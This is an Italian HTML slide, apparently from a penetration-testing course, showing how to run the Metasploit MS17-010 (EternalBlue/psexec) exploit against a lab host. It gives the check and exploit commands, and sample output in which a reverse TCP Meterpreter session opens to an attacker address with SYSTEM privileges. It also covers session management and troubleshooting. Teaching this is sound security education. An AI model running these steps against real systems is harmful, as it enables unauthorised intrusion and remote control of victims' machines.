@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Esecuzione Exploit</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">🚀 Esecuzione Exploit</h1>
+        <div class="subtitle">Lanciare l'attacco e gestire le sessioni</div>
+
+        <div class="grid-2-col">
+            <div class="card border-green">
+                <div class="card-title">✅ Comando CHECK</div>
+                <div class="card-text">
+                    <p>Prima di lanciare l'exploit, verifica se il target è vulnerabile:</p>
+                    <div class="code-box">msf6 exploit(...) > check
+
+[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 
+[+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010!</div>
+                    <br>
+                    <p style="color: #4CAF50;">✅ Il comando <span class="tech-term">check</span> verifica la vulnerabilità senza sfruttarla.</p>
+                    <br>
+                    <p style="color: #FFD54F;">⚠️ Non tutti i moduli supportano il check.</p>
+                </div>
+            </div>
+
+            <div class="card border-blue">
+                <div class="card-title">💥 Comando EXPLOIT / RUN</div>
+                <div class="card-text">
+                    <p>Lanciare l'exploit:</p>
+                    <div class="code-box">msf6 exploit(...) > exploit
+# oppure
+msf6 exploit(...) > run</div>
+                    <br>
+                    <p><strong>Opzioni utili:</strong></p>
+                    <ul style="margin-top: 10px; line-height: 1.8;">
+                        <li><span class="tech-term">exploit -j</span> - Esegui come job in background</li>
+                        <li><span class="tech-term">exploit -z</span> - Non interagire con la sessione</li>
+                        <li><span class="tech-term">run -j</span> - Esegui come job</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="card border-purple" style="margin-top: 25px;">
+            <div class="card-title">🎯 Exploit Riuscito!</div>
+            <div class="card-text">
+                <div class="code-box">msf6 exploit(windows/smb/ms17_010_psexec) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:4444
+[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
+[*] 10.10.10.40:445 - Built a write-what-where primitive...
+[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
+[*] 10.10.10.40:445 - Selecting PowerShell target
+[*] 10.10.10.40:445 - Executing the payload...
+[+] 10.10.10.40:445 - Service start timed out, OK if running a command
+[*] Sending stage (175174 bytes) to 10.10.10.40
+[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49159)
+
+meterpreter ></div>
+                <br>
+                <p style="color: #4CAF50; font-weight: 600;">✨ Successo! Hai ottenuto una sessione Meterpreter con privilegi SYSTEM!</p>
+            </div>
+        </div>
+
+        <div class="grid-2-col" style="margin-top: 25px;">
+            <div class="card border-yellow">
+                <div class="card-title">📋 Gestione Sessioni</div>
+                <div class="card-text">
+                    <p><strong>Vedere sessioni attive:</strong></p>
+                    <div class="code-box">msf6 > sessions</div>
+                    <br>
+                    <p><strong>Interagire con una sessione:</strong></p>
+                    <div class="code-box">msf6 > sessions -i 1</div>
+                    <br>
+                    <p><strong>Background della sessione:</strong></p>
+                    <div class="code-box">meterpreter > background
+# oppure Ctrl+Z</div>
+                </div>
+            </div>
+
+            <div class="card border-red">
+                <div class="card-title">⚠️ Se Fallisce</div>
+                <div class="card-text">
+                    <p><strong>Possibili cause:</strong></p>
+                    <ul style="margin-top: 10px; line-height: 1.8;">
+                        <li>Target non vulnerabile</li>
+                        <li>Firewall/IDS blocca l'attacco</li>
+                        <li>Bad characters nel payload</li>
+                        <li>Target sbagliato</li>
+                        <li>Parametri non corretti</li>
+                    </ul>
+                    <br>
+                    <p style="color: #F44336;">🔍 Analizza l'output, prova target diversi o payload alternativi.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>const slideNumero = 13;</script>
+    <script src="main.js"></script>
+</body>
+</html>
